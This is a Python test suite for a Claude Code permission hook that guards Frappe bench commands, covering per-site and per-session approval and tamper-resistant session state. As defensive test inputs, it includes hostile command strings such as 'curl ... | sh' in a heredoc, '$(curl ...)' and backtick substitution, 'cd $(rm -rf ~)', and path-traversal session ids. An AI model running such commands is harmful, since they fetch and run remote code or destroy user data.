#!/usr/bin/env python3
"""Tests for site environments and per-session site approval in hooks/guard.py.

    python3 tests/test_site_approval.py

Two relaxations of the site rules are under test, and both are allows - the decision that
announces nothing when it is wrong. A `.local` site is a development site and is allowed;
any other explicitly named site asks once per Claude Code session and is allowed after
that, for that exact site only. Everything else here is the set of ways either relaxation
could reach further than that: an unnamed site, `--site all`, a second site, a destructive
operation, an approval nobody gave, another session's approval, and state that cannot be
trusted.

Every lifecycle case runs the hook as a process, payload on stdin, with TMPDIR pointed at a
scratch directory, which is where the session state lives - so nothing here touches the
real temp directory, and nothing reaches the repository.

No framework and nothing to install: standard library only.
"""

import importlib.machinery
import importlib.util
import json
import os
import subprocess
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
GUARD = ROOT / "hooks" / "guard.py"


def load_guard():
    loader = importlib.machinery.SourceFileLoader("guard", str(GUARD))
    spec = importlib.util.spec_from_loader("guard", loader)
    module = importlib.util.module_from_spec(spec)
    loader.exec_module(module)
    return module


g = load_guard()


class Hook:
    """The hook as Claude Code runs it, with its state confined to one scratch directory."""

    def __init__(self, tmp):
        self.tmp = Path(tmp)
        self.env = dict(os.environ, TMPDIR=str(self.tmp), TEMP=str(self.tmp),
                        TMP=str(self.tmp))
        self.calls = 0

    def run(self, payload):
        proc = subprocess.run(
            [sys.executable, str(GUARD)], input=json.dumps(payload),
            capture_output=True, text=True, timeout=60, env=self.env,
        )
        return proc

    def pre(self, command, session, tool_use_id=None):
        """(decision or None, reason, tool_use_id). None is no decision: no output."""
        self.calls += 1
        tool_use_id = tool_use_id or "toolu_%04d" % self.calls
        payload = {"hook_event_name": "PreToolUse", "tool_name": "Bash",
                   "tool_input": {"command": command}, "tool_use_id": tool_use_id}
        if session is not None:
            payload["session_id"] = session
        proc = self.run(payload)
        if proc.returncode != 0:
            return "exit%d" % proc.returncode, proc.stderr[-200:], tool_use_id
        if not proc.stdout.strip():
            return None, "", tool_use_id
        block = json.loads(proc.stdout)["hookSpecificOutput"]
        return block["permissionDecision"], block["permissionDecisionReason"], tool_use_id

    def post(self, command, session, tool_use_id):
        """A PostToolUse for a command that ran. Returns the finished process."""
        return self.run({"hook_event_name": "PostToolUse", "tool_name": "Bash",
                         "tool_input": {"command": command}, "tool_use_id": tool_use_id,
                         "tool_response": {"stdout": "", "stderr": "",
                                           "interrupted": False},
                         "session_id": session})

    def approve(self, command, session):
        """Ask, the user approves, the command runs: Pre then Post for one tool call."""
        decision, _reason, tool_use_id = self.pre(command, session)
        proc = self.post(command, session, tool_use_id)
        return decision, proc

    def state_root(self):
        return self.tmp / ("frappe-orchestrator-%d" % os.getuid())

    def state_path(self, session):
        return self.state_root() / "sessions" / ("%s.json" % session)


SESSION_A = "11111111-aaaa-4aaa-8aaa-aaaaaaaaaaaa"
SESSION_B = "22222222-bbbb-4bbb-8bbb-bbbbbbbbbbbb"


# --------------------------------------------------------------------------
# In process: the helpers that name a site
# --------------------------------------------------------------------------

DEVELOPMENT = [
    ("atyaf.local", True), ("safeer.local", True), ("masa.local", True),
    ("falafel.local", True), ("MYSITE.LOCAL", True), ("a.b.local", True),
    ("demo.example.com", False), ("erp.example.com", False), ("10.0.0.20", False),
    ("staging", False), ("dev-server", False), ("localhost", False), ("local", False),
    (".local", False), ("atyaf.local.", False), ("atyaf.localhost", False),
    ("atyaflocal", False), ("all", False), ("ALL", False), ("$SITE", False),
    ("{a,b}.local", False), ("*.local", False), ("../x.local", False), ("", False),
    (None, False), (5, False),
]

BENCH_SITES = [
    ("bench --site atyaf.local console", "atyaf.local"),
    ("bench -s atyaf.local console", "atyaf.local"),
    ("bench --site=atyaf.local console", "atyaf.local"),
    ("bench console", None),
    ("bench --site all console", g.AMBIGUOUS),
    ("bench --site $SITE console", g.AMBIGUOUS),
    ("bench --site", g.AMBIGUOUS),
    ("bench --site a.local --site b.local console", g.AMBIGUOUS),
    ("bench --site a.local -s a.local console", g.AMBIGUOUS),
]

SNIPPET_SITES = [
    ("frappe.get_all('User')", set()),
    ("frappe.init(site='atyaf.local'); frappe.connect()", {"atyaf.local"}),
    ('frappe.init("atyaf.local")', {"atyaf.local"}),
    ('frappe.connect(site="demo.example.com")', {"demo.example.com"}),
    ('frappe.init(site=\\"atyaf.local\\")', {"atyaf.local"}),
    ("with frappe.init_site('x.local'): pass", {"x.local"}),
    ("frappe.init(site=site_name)", None),
    ("frappe.init(sites_path='.', site='a.local')", None),
    ("frappe.init(site='a.local'); frappe.init(site='b.local')", {"a.local", "b.local"}),
    ("bench --site a.local execute frappe.init", None),
]


def check_helpers():
    problems = []
    for site, want in DEVELOPMENT:
        if g.is_development_site(site) != want:
            problems.append("is_development_site(%r) is %r, wanted %r"
                            % (site, not want, want))
    for command, want in BENCH_SITES:
        got = g.bench_site(g.split_tokens(command))
        if got is not want and got != want:
            problems.append("bench_site(%r) is %r, wanted %r" % (command, got, want))
    for text, want in SNIPPET_SITES:
        got = g.snippet_sites(text)
        if got != want:
            problems.append("snippet_sites(%r) is %r, wanted %r" % (text, got, want))
    return problems


# --------------------------------------------------------------------------
# No session at all: what the site alone decides
# --------------------------------------------------------------------------

# (command, expected decision). None is no decision from the hook, which leaves the
# command to Claude Code's own permission check - never an allow this hook granted.
NO_SESSION = [
    # --- development sites: routine access runs without a prompt -------------
    ("bench --site atyaf.local console", "allow"),
    ("bench --site safeer.local execute frappe.client.get_count --kwargs \"{'doctype': 'User'}\"",
     "allow"),
    ("bench --site masa.local run-tests --app erpnext", "allow"),
    ("bench --site falafel.local list-apps", "allow"),
    ("bench --site MYSITE.LOCAL list-apps", "allow"),
    ("bench -s atyaf.local console", "allow"),
    ("bench --site=atyaf.local list-apps", "allow"),
    ("cd ~/frappe-bench && bench --site atyaf.local list-apps 2>&1 | tail -20", "allow"),
    ("bench --site atyaf.local console <<'EOF'\nprint(frappe.get_all('User'))\nEOF", "allow"),
    ("bench --site atyaf.local console <<EOF\nusers = frappe.get_all('User')\nprint(users)\nEOF",
     "allow"),
    ("bench --site atyaf.local console <<-'EOF'\n\tprint(1)\n\tEOF", "allow"),
    ("python3 -c \"frappe.init(site='atyaf.local')\"", "allow"),
    ("bench --site atyaf.local migrate", "allow"),
    ("bench --site atyaf.local clear-cache", "allow"),
    ("bench -s atyaf.local migrate --skip-failing", "allow"),
    ("bench --site=safeer.local clear-cache", "allow"),
    ("cd ~/frappe-bench && bench --site atyaf.local migrate 2>&1 | tail -40", "allow"),

    # --- not development: explicit, but protected -----------------------------
    ("bench --site demo.example.com console", "ask"),
    ("bench --site erp.example.com list-apps", "ask"),
    ("bench --site 10.0.0.20 console", "ask"),
    ("bench --site staging console", "ask"),
    ("bench --site dev-server console", "ask"),
    ("bench --site localhost console", "ask"),
    ("bench --site atyaf.local. console", "ask"),
    ("bench --site atyaf.localhost console", "ask"),
    ("bench --site demo.example.com migrate", "ask"),
    ("bench --site production.example.com clear-cache", "ask"),
    ("bench -s demo.example.com migrate", "ask"),
    ("bench --site staging migrate", "ask"),

    # --- unnamed and all: never relaxed ---------------------------------------
    ("bench console", "ask"),
    ("bench execute frappe.client.get_count", "ask"),
    ("bench migrate", "ask"),
    ("bench clear-cache", "ask"),
    ("bench --site all console", "ask"),
    ("bench --site all migrate", "ask"),
    ("bench --site all clear-cache", "ask"),
    ("bench -s all migrate", "ask"),
    ("bench -s all list-apps", "ask"),
    ("bench --site=all list-apps", "ask"),
    ("python3 -c \"frappe.get_all('User')\"", "ask"),
    ("python3 -c \"frappe.init(site=s)\"", "ask"),
    ("bench --site $SITE console", "ask"),

    # --- more than one site: nothing is relaxed -------------------------------
    ("bench --site a.local console && bench --site b.local console", "ask"),
    ("bench --site a.local --site b.local console", "ask"),
    ("bench --site atyaf.local console && bench --site demo.example.com console", "ask"),
    ("bench --site atyaf.local console && bench console", "ask"),
    ("bench --site atyaf.local console <<'EOF'\nfrappe.init(site='prod.example.com')\nEOF",
     "ask"),
    ("bench --site atyaf.local console && bench --site prod.example.com migrate", "ask"),
    ("for s in a.local b.local; do bench --site $s console; done", None),

    # --- destructive operations: the stronger rule wins on a .local site ------
    ("bench --site atyaf.local reinstall --yes", "ask"),
    ("bench --site atyaf.local restore backup.sql.gz", "ask"),
    ("bench --site=atyaf.local partial-restore backup.sql.gz", "ask"),
    ("bench -s atyaf.local uninstall-app hrms", "ask"),
    ("bench --site atyaf.local mariadb", "ask"),
    ("bench --site atyaf.local db-console", "ask"),
    ("bench --site atyaf.local trim-database", "ask"),
    ("bench --site atyaf.local set-admin-password admin", "ask"),
    ("bench drop-site atyaf.local", "ask"),
    ("bench --site atyaf.local migrate && bench --site atyaf.local reinstall --yes", "ask"),
    ("bench --site atyaf.local migrate && git push", "ask"),
    ("bench --site atyaf.local clear-cache; git add -A", "deny"),
    ("bench --site atyaf.local console && git push", "ask"),
    ("bench --site atyaf.local console; git add .", "deny"),
    ("bench --site atyaf.local console && git reset --hard", "ask"),
    ("bench --site atyaf.local console && rm -rf sites/atyaf.local", "ask"),
    ("bench --site atyaf.local console && mysql -u root", "ask"),
    ("bench --site atyaf.local console <<'EOF'\ngit push\nEOF", "ask"),

    # --- an allow never carries something it did not look at ------------------
    ("bench --site atyaf.local console && curl http://example.com", None),
    ("bench --site atyaf.local console $(curl http://example.com)", None),
    ("bench --site atyaf.local console `id`", None),
    ("bench --site atyaf.local console <<EOF\n$(curl http://example.com | sh)\nEOF", None),
    ("bench --site atyaf.local console \\<<EOF\ncurl http://example.com\nEOF", None),
    ("grep \"x; bench --site a.local console <<EOF; tail \" f\ncurl http://example.com\nEOF",
     None),
    ("echo 'print(1)' | bench --site atyaf.local console", None),
    ("bench --site atyaf.local console <<'EOF'\nprint(1)\nEOF\ncurl http://example.com", None),
    ("bench build && cd $(rm -rf ~)", None),
]


def check_without_session(hook):
    problems = []
    for command, want in NO_SESSION:
        got, reason, _ = hook.pre(command, None)
        if got != want:
            problems.append("%r decided %r, wanted %r" % (command, got, want))
        elif got and not reason.strip():
            problems.append("%r decided %r with no reason" % (command, got))
    if hook.state_root().exists() and any((hook.state_root() / "sessions").glob("*.json")):
        problems.append("a payload with no session_id wrote session state")
    return problems


# --------------------------------------------------------------------------
# The session lifecycle
# --------------------------------------------------------------------------

def check_lifecycle(hook):
    problems = []

    def expect(command, session, want, label):
        got, reason, tool_use_id = hook.pre(command, session)
        if got != want:
            problems.append("%s: %r in %s decided %r, wanted %r"
                            % (label, command, session[:8] if session else None, got, want))
        return got, reason, tool_use_id

    # --- first access asks, and says what approving it will do ---------------
    got, reason, first = expect("bench --site demo.example.com list-apps", SESSION_A, "ask",
                                "first access")
    if got == "ask" and "rest of this Claude Code session" not in reason:
        problems.append("the first ask does not tell the user the approval is remembered")

    # --- the ask alone approved nothing ---------------------------------------
    expect("bench --site demo.example.com console", SESSION_A, "ask", "before PostToolUse")

    # --- the approved call runs, and only then is the site approved -----------
    proc = hook.post("bench --site demo.example.com list-apps", SESSION_A, first)
    if proc.returncode != 0 or proc.stdout.strip():
        problems.append("PostToolUse exited %d and wrote %r - it must do neither"
                        % (proc.returncode, proc.stdout[:80]))
    got, reason, _ = expect("bench --site demo.example.com console", SESSION_A, "allow",
                            "after approval")
    if got == "allow" and "approved earlier in this Claude Code session" not in reason:
        problems.append("a session allow does not say where the approval came from: %r"
                        % reason[:100])
    expect("bench --site demo.example.com execute frappe.client.get_count", SESSION_A,
           "allow", "after approval")
    expect("bench -s demo.example.com run-tests --app erpnext", SESSION_A, "allow",
           "after approval")
    expect("bench --site demo.example.com console <<'EOF'\nprint(frappe.get_all('User'))\nEOF",
           SESSION_A, "allow", "after approval, heredoc")

    # --- exactly that site, exactly that session ------------------------------
    expect("bench --site production.example.com console", SESSION_A, "ask", "other site")
    expect("bench --site DEMO.example.com console", SESSION_A, "ask", "other spelling")
    expect("bench --site demo.example.com console", SESSION_B, "ask", "other session")

    # --- what the approval never reaches ---------------------------------------
    for command, want in (
        ("bench console", "ask"),
        ("bench execute frappe.client.get_count", "ask"),
        ("bench migrate", "ask"),
        ("bench --site all console", "ask"),
        ("bench --site demo.example.com reinstall --yes", "ask"),
        ("bench --site demo.example.com restore backup.sql.gz", "ask"),
        ("bench --site demo.example.com mariadb", "ask"),
        ("bench --site demo.example.com console && git push", "ask"),
        ("bench --site demo.example.com console; git add -A", "deny"),
        ("bench --site demo.example.com console && bench --site other.example.com console",
         "ask"),
        ("bench --site demo.example.com console <<'EOF'\nfrappe.init(site='prod.example.com')\nEOF",
         "ask"),
        ("python3 -c \"frappe.get_all('User')\"", "ask"),
    ):
        expect(command, SESSION_A, want, "beyond the approval")

    # --- a rejected ask: Pre with no Post ---------------------------------------
    expect("bench --site rejected.example.com console", SESSION_B, "ask", "rejected, first")
    expect("bench --site rejected.example.com console", SESSION_B, "ask", "rejected, again")

    # --- a PostToolUse that matches no ask -------------------------------------
    hook.post("bench --site forged.example.com console", SESSION_B, "toolu_never_asked")
    expect("bench --site forged.example.com console", SESSION_B, "ask", "Post with no Pre")

    # --- a PostToolUse whose command is not the one that was asked about --------
    _, _, swapped = hook.pre("bench --site first.example.com console", SESSION_B)
    hook.post("bench --site second.example.com console", SESSION_B, swapped)
    expect("bench --site first.example.com console", SESSION_B, "ask", "swapped, first")
    expect("bench --site second.example.com console", SESSION_B, "ask", "swapped, second")

    # --- a PostToolUse from another session ------------------------------------
    _, _, crossed = hook.pre("bench --site crossed.example.com console", SESSION_A)
    hook.post("bench --site crossed.example.com console", SESSION_B, crossed)
    expect("bench --site crossed.example.com console", SESSION_A, "ask", "crossed, A")
    expect("bench --site crossed.example.com console", SESSION_B, "ask", "crossed, B")

    # --- an approved destructive command approves nothing ----------------------
    hook.approve("bench --site wiped.example.com reinstall --yes", SESSION_B)
    expect("bench --site wiped.example.com console", SESSION_B, "ask", "after a reinstall")

    # --- an allow the hook granted itself approves nothing ---------------------
    hook.approve("bench --site atyaf.local migrate", SESSION_B)
    expect("bench --site atyaf.local. console", SESSION_B, "ask", "after a .local migrate")

    # --- a multi-site command approves neither site -----------------------------
    hook.approve("bench --site m1.example.com console && bench --site m2.example.com console",
                 SESSION_B)
    expect("bench --site m1.example.com console", SESSION_B, "ask", "multi-site, first")
    expect("bench --site m2.example.com console", SESSION_B, "ask", "multi-site, second")

    # --- development sites need no state at all --------------------------------
    hook.approve("bench --site atyaf.local console", SESSION_B)
    state = json.loads(hook.state_path(SESSION_B).read_text())
    if "atyaf.local" in state["approved_sites"] or "atyaf.local" in state["pending"].values():
        problems.append("a development site was written to session state: %r" % state)

    # --- the state is where it should be, and holds only approved sites ---------
    state = json.loads(hook.state_path(SESSION_A).read_text())
    if state.get("session_id") != SESSION_A:
        problems.append("session A's state names session %r" % state.get("session_id"))
    if state.get("approved_sites") != ["demo.example.com"]:
        problems.append("session A approved %r, wanted only demo.example.com"
                        % state.get("approved_sites"))
    state = json.loads(hook.state_path(SESSION_B).read_text())
    if state.get("approved_sites"):
        problems.append("session B approved %r and was never approved anything"
                        % state.get("approved_sites"))
    mode = hook.state_root().stat().st_mode & 0o777
    if mode != 0o700:
        problems.append("the state directory is mode %o, wanted 700" % mode)
    return problems


def check_migrate_lifecycle(hook):
    """migrate and clear-cache on a protected site follow the same session lifecycle.

    They used to be allowed on any named site by a carve-out of their own. Now they are
    routine site access like console, so a non-.local site asks for them first.
    """
    problems = []
    site = "demo.example.com"

    def expect(command, session, want, label):
        got, _reason, tool_use_id = hook.pre(command, session)
        if got != want:
            problems.append("%s: %r in %s decided %r, wanted %r"
                            % (label, command, session[:8], got, want))
        return tool_use_id

    # --- first access asks, for either operation -------------------------------
    expect("bench --site production.example.com clear-cache", SESSION_A, "ask",
           "first clear-cache")
    first = expect("bench --site %s migrate" % site, SESSION_A, "ask", "first migrate")

    # --- rejected: the ask alone approves nothing ------------------------------
    expect("bench --site %s migrate" % site, SESSION_A, "ask", "migrate not yet run")
    expect("bench --site %s clear-cache" % site, SESSION_A, "ask", "migrate not yet run")

    # --- approved and run: the site is approved for this session ----------------
    hook.post("bench --site %s migrate" % site, SESSION_A, first)
    for command in ("bench --site %s migrate" % site, "bench --site %s clear-cache" % site,
                    "bench -s %s migrate --skip-failing" % site,
                    "bench --site %s console" % site):
        expect(command, SESSION_A, "allow", "after the approved migrate")

    # --- and nothing beyond it --------------------------------------------------
    expect("bench --site production.example.com clear-cache", SESSION_A, "ask",
           "another site")
    expect("bench --site %s migrate" % site, SESSION_B, "ask", "a new session")
    expect("bench migrate", SESSION_A, "ask", "unnamed migrate")
    expect("bench clear-cache", SESSION_A, "ask", "unnamed clear-cache")
    expect("bench --site all migrate", SESSION_A, "ask", "--site all migrate")
    expect("bench --site all clear-cache", SESSION_A, "ask", "--site all clear-cache")
    expect("bench --site %s reinstall --yes" % site, SESSION_A, "ask", "destructive")
    expect("bench --site %s migrate && bench --site %s restore b.sql.gz" % (site, site),
           SESSION_A, "ask", "destructive, chained")
    expect("bench --site %s migrate && git push" % site, SESSION_A, "ask", "push")
    expect("bench --site %s clear-cache; git add ." % site, SESSION_A, "deny", "staging")
    return problems


# --------------------------------------------------------------------------
# State that cannot be trusted
# --------------------------------------------------------------------------

def approved_state(session, *sites):
    return json.dumps({"session_id": session, "approved_sites": list(sites), "pending": {}})


CORRUPT = [
    ("not JSON", "{not json"),
    ("empty file", ""),
    ("a list", "[]"),
    ("another session's file", approved_state(SESSION_B, "demo.example.com")),
    ("no session_id", json.dumps({"approved_sites": ["demo.example.com"], "pending": {}})),
    ("approved_sites a string",
     json.dumps({"session_id": SESSION_A, "approved_sites": "demo.example.com",
                 "pending": {}})),
    ("approved_sites with junk",
     json.dumps({"session_id": SESSION_A, "approved_sites": ["demo.example.com", 5],
                 "pending": {}})),
    ("approved_sites holds all",
     json.dumps({"session_id": SESSION_A, "approved_sites": ["all"], "pending": {}})),
    ("pending a list",
     json.dumps({"session_id": SESSION_A, "approved_sites": ["demo.example.com"],
                 "pending": []})),
]


def check_untrusted_state(tmp):
    problems = []
    command = "bench --site demo.example.com console"

    for index, (label, text) in enumerate(CORRUPT):
        hook = Hook(Path(tmp) / ("corrupt-%02d" % index))
        hook.pre("ls", SESSION_A)   # nothing to decide; creates nothing
        path = hook.state_path(SESSION_A)
        path.parent.mkdir(parents=True, exist_ok=True, mode=0o700)
        os.chmod(hook.state_root(), 0o700)
        path.write_text(text)
        got, _, _ = hook.pre(command, SESSION_A)
        if got != "ask":
            problems.append("%s: decided %r, wanted ask" % (label, got))

    # The control: the same layout with a valid file allows, so the asks above are the
    # corruption being caught and not the file being ignored altogether.
    hook = Hook(Path(tmp) / "control")
    path = hook.state_path(SESSION_A)
    path.parent.mkdir(parents=True, exist_ok=True, mode=0o700)
    os.chmod(hook.state_root(), 0o700)
    path.write_text(approved_state(SESSION_A, "demo.example.com"))
    got, _, _ = hook.pre(command, SESSION_A)
    if got != "allow":
        problems.append("control: a valid state file decided %r, wanted allow" % got)

    # A state directory someone else could write is not trusted, however valid its file.
    os.chmod(hook.state_root(), 0o777)
    got, _, _ = hook.pre(command, SESSION_A)
    if got != "ask":
        problems.append("a world-writable state directory decided %r, wanted ask" % got)
    os.chmod(hook.state_root(), 0o700)

    # Nor is one that is a symlink to somewhere else.
    hook = Hook(Path(tmp) / "symlinked")
    elsewhere = Path(tmp) / "elsewhere"
    (elsewhere / "sessions").mkdir(parents=True, mode=0o700)
    os.chmod(elsewhere, 0o700)
    (elsewhere / "sessions" / ("%s.json" % SESSION_A)).write_text(
        approved_state(SESSION_A, "demo.example.com"))
    hook.tmp.mkdir(parents=True, exist_ok=True)
    os.symlink(elsewhere, hook.state_root())
    got, _, _ = hook.pre(command, SESSION_A)
    if got != "ask":
        problems.append("a symlinked state directory decided %r, wanted ask" % got)

    # An unreadable file reads as no approvals. Root reads it anyway, so skip there.
    if os.getuid() != 0:
        hook = Hook(Path(tmp) / "unreadable")
        path = hook.state_path(SESSION_A)
        path.parent.mkdir(parents=True, exist_ok=True, mode=0o700)
        os.chmod(hook.state_root(), 0o700)
        path.write_text(approved_state(SESSION_A, "demo.example.com"))
        os.chmod(path, 0)
        got, _, _ = hook.pre(command, SESSION_A)
        os.chmod(path, 0o600)
        if got != "ask":
            problems.append("an unreadable state file decided %r, wanted ask" % got)

    # A state location that cannot be created at all still decides - it asks.
    hook = Hook(Path(tmp) / "blocked")
    hook.tmp.mkdir(parents=True, exist_ok=True)
    hook.state_root().write_text("a file where the directory should be")
    got, _, tool_use_id = hook.pre(command, SESSION_A)
    proc = hook.post(command, SESSION_A, tool_use_id)
    if got != "ask":
        problems.append("an unusable state location decided %r, wanted ask" % got)
    if proc.returncode != 0 or proc.stdout.strip():
        problems.append("PostToolUse with an unusable state location exited %d, wrote %r"
                        % (proc.returncode, proc.stdout[:60]))

    # Session ids that are not ids keep nothing and write nothing outside the directory.
    hook = Hook(Path(tmp) / "bad-ids")
    for session in ("../../escape", "short", "served:abc", "a/b/c/d/e/f", "x" * 200, 7):
        hook.approve(command, session)
        got, _, _ = hook.pre(command, session)
        if got != "ask":
            problems.append("session id %r decided %r after approval, wanted ask"
                            % (session, got))
    written = sorted(p.name for p in hook.tmp.rglob("*") if p.is_file() and p.name != ".lock")
    if written:
        problems.append("invalid session ids wrote %r" % written)
    return problems


def check_post_payloads(tmp):
    """PostToolUse never decides, never blocks, and never fails, whatever it is sent."""
    problems = []
    hook = Hook(tmp)
    for label, payload in (
        ("no command", {"hook_event_name": "PostToolUse", "session_id": SESSION_A}),
        ("no tool_use_id", {"hook_event_name": "PostToolUse", "session_id": SESSION_A,
                            "tool_input": {"command": "bench --site x.example.com console"}}),
        ("no session", {"hook_event_name": "PostToolUse", "tool_use_id": "toolu_1",
                        "tool_input": {"command": "bench --site x.example.com console"}}),
        ("command a number", {"hook_event_name": "PostToolUse", "session_id": SESSION_A,
                              "tool_use_id": "toolu_1", "tool_input": {"command": 5}}),
        ("a dangerous command", {"hook_event_name": "PostToolUse", "session_id": SESSION_A,
                                 "tool_use_id": "toolu_1",
                                 "tool_input": {"command": "git add ."}}),
    ):
        proc = hook.run(payload)
        if proc.returncode != 0 or proc.stdout.strip() or "Traceback" in proc.stderr:
            problems.append("%s: exit %d, stdout %r, stderr %r"
                            % (label, proc.returncode, proc.stdout[:60], proc.stderr[-80:]))
    return problems


def check_hook_registration():
    """Both events are registered for Bash, against this guard."""
    problems = []
    config = json.loads((ROOT / "hooks" / "hooks.json").read_text())["hooks"]
    for event in ("PreToolUse", "PostToolUse"):
        entries = config.get(event) or []
        if not any(
            entry.get("matcher") == "Bash"
            and any(h.get("command", "").endswith("/hooks/guard.py")
                    for h in entry.get("hooks", []))
            for entry in entries
        ):
            problems.append("%s is not registered for Bash against hooks/guard.py" % event)
    return problems


def check_rule_flags():
    """site_access sits on the site rules and nowhere a relaxation would be wrong."""
    problems = []
    rules = json.loads((ROOT / "config" / "command-boundaries.json").read_text())["rules"]
    flagged = sorted(r["name"] for r in rules if r.get("site_access"))
    if flagged != ["frappe-connection", "site-named", "site-unnamed"]:
        problems.append("site_access is on %r" % flagged)
    names = [r["name"] for r in rules]
    if names.index("destructive-site-operation") > min(
        names.index("site-named"), names.index("site-unnamed")
    ):
        problems.append("destructive-site-operation does not precede the site rules, so "
                        "they would match first and the site could relax it")
    # The loader refuses a flag on a rule that does not ask.
    for overrides in ({"site_access": "yes"}, {"hook": "deny", "site_access": True}):
        rule = dict(next(r for r in rules if r["name"] == "site-named"), **overrides)
        if g.rule_fault(rule, 0) is None:
            problems.append("the loader accepts site-named with %r" % overrides)
    return problems


def main():
    failures = []
    failures.extend("helpers: " + p for p in check_helpers())
    failures.extend("rule data: " + p for p in check_rule_flags())
    failures.extend("registration: " + p for p in check_hook_registration())
    with tempfile.TemporaryDirectory() as tmp:
        failures.extend("no session: " + p for p in check_without_session(Hook(tmp)))
    with tempfile.TemporaryDirectory() as tmp:
        failures.extend("lifecycle: " + p for p in check_lifecycle(Hook(tmp)))
    with tempfile.TemporaryDirectory() as tmp:
        failures.extend("migrate lifecycle: " + p for p in check_migrate_lifecycle(Hook(tmp)))
    with tempfile.TemporaryDirectory() as tmp:
        failures.extend("untrusted state: " + p for p in check_untrusted_state(tmp))
    with tempfile.TemporaryDirectory() as tmp:
        failures.extend("PostToolUse: " + p for p in check_post_payloads(tmp))

    print("%d development names, %d bench site forms, %d snippets, %d sessionless "
          "commands, %d corrupt states, the session and migrate lifecycles and hook "
          "registration checked"
          % (len(DEVELOPMENT), len(BENCH_SITES), len(SNIPPET_SITES), len(NO_SESSION),
             len(CORRUPT)))
    if failures:
        print("\nFAILED (%d):" % len(failures))
        for line in failures:
            print("  - %s" % line)
        return 1
    print("\nok")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
